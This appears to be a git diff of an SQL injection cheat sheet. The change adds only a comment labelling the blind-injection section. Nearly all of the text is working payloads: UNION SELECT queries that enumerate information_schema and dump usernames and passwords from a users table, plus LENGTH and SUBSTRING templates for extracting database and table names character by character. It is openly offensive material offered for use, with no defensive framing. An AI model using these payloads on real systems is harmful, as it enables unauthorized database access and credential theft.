@@ -266,6 +266,7 @@ UNION SELECT TABLE_NAME,TABLE_SCHEMA FROM information_schema.tables WHERE TABLE_
 UNION SELECT TABLE_NAME,COLUMN_NAME FROM information_schema.columns WHERE TABLE_NAME = 0x7573657273# 0x7573657273 = 'users'
 UNION SELECT USER, PASSWORD FROM USERS#
 
+-- blind sql injection
 if((select count(*) from information_schema.tables where table_schema='{DBNAME}') = 1, 1, 0) # check exist dbname
 LENGTH((select table_name from information_schema.tables where table_schema='{DBNAME}'))={i} # examining dbname length
 SUBSTRING((select table_name from information_schema.tables where table_schema='{DBNAME}'),{i},1)='{word}' # examining table name
